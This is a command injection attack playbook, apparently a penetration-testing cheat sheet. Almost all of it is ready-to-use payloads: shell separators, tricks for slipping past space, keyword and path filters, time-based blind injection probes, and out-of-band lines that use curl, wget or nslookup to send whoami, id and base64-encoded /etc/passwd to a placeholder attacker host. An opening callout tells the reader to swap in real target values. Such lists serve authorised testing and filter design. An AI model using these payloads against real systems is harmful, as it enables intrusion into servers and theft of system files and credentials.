## Command Injection Attack Playbook

> **IMPORTANT:** All payloads in this playbook are EXAMPLES that must be MODIFIED for your specific target. Replace placeholders like `{COMMAND}`, `{ATTACKER_URL}`, `{FILE_PATH}` with actual values. Adapt payloads based on:
> - Target operating system (Linux, Windows, macOS)
> - Available commands and binaries
> - Filtering/WAF behavior
> - Shell environment (bash, sh, cmd, PowerShell, etc.)

### Command Separators

```
; cmd                         → | cmd
                              → || cmd
                              → & cmd
                              → && cmd
                              → %0a cmd (newline)
                              → `cmd`
                              → $(cmd)
```

### Space Alternatives

```
cat /etc/passwd               → cat${IFS}/etc/passwd
                              → cat$IFS/etc/passwd
                              → {cat,/etc/passwd}
                              → cat</etc/passwd
                              → cat%09/etc/passwd
                              → X=$'\x20';cat${X}/etc/passwd
```

### Keyword Alternatives

```
cat                           → c'a't
                              → c""at
                              → c\at
                              → /???/c?t
                              → /???/??t
                              → $(echo Y2F0|base64 -d)
                              → $'\x63\x61\x74'
```

### Path Alternatives

```
/etc/passwd                   → /e?c/p?ss??
                              → /e*c/p*d
                              → ././etc/./passwd
                              → /etc//passwd
                              → /etc/passwd/.
```

### Shell-Specific Whitespace

```
Context    │ Alternatives
───────────┼─────────────────────────────────────────────────────
Shell      │ ${IFS}, $IFS, {,}, <>, TAB, NEWLINE, \t, \n
```

### Quote Equivalents for Shell

```
Context    │ Alternatives
───────────┼─────────────────────────────────────────────────────
Shell      │ ' " ` $'..', $"...", unquoted, \' \"
```

### Comment Syntax for Shell

```
Context    │ Comment Styles
───────────┼───────────────────────────────────────────────────────
Shell      │ # (to EOL), : 'comment' (noop colon)
```

### Concatenation Methods for Shell

```
Context    │ Concatenation Methods
───────────┼─────────────────────────────────────────────────────
Shell      │ c'a't, c""at, $'\x63\x61\x74', echo Y2F0|base64 -d
```

### Execution Indirection

```
- Shell: $(cmd), `cmd`, bash -c 'cmd', sh<<<'cmd'
```

### Common Blind Command Injection Techniques

**Time-based:**
```
; sleep 5
| sleep 5
|| sleep 5
& sleep 5 &
$(sleep 5)
`sleep 5`
```

**Out-of-band (DNS):**
```
; nslookup $(whoami).{ATTACKER_URL}
| curl http://{ATTACKER_URL}/$(whoami)
|| wget http://{ATTACKER_URL}/?d=$(cat /etc/passwd | base64)
```

**Out-of-band (HTTP):**
```
; curl http://{ATTACKER_URL}/exfil?data=$(cat /etc/passwd | base64)
| wget -q -O- http://{ATTACKER_URL}/$(id)
```

### Filter Bypass Combinations

**When semicolon is blocked:**
```
%0a command    (newline)
| command      (pipe)
|| command     (or)
$(command)     (subshell)
`command`      (backtick)
```

**When spaces are blocked:**
```
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
```

**When keywords are blocked:**
```
c'a't /etc/passwd
c""at /etc/passwd
/???/c?t /etc/passwd
$(echo Y2F0|base64 -d) /etc/passwd
```

### Building Blocks Approach

```
COMMAND INJECTION BUILDING BLOCKS:
1. Separator: ;, |, ||, &, &&, %0a, $(), ``
2. Space bypass: ${IFS}, %09, {,}, <>
3. Keyword bypass: quotes, wildcards, encoding
4. Command: id, whoami, cat, curl, wget
5. Output: direct, time-based, OOB
```


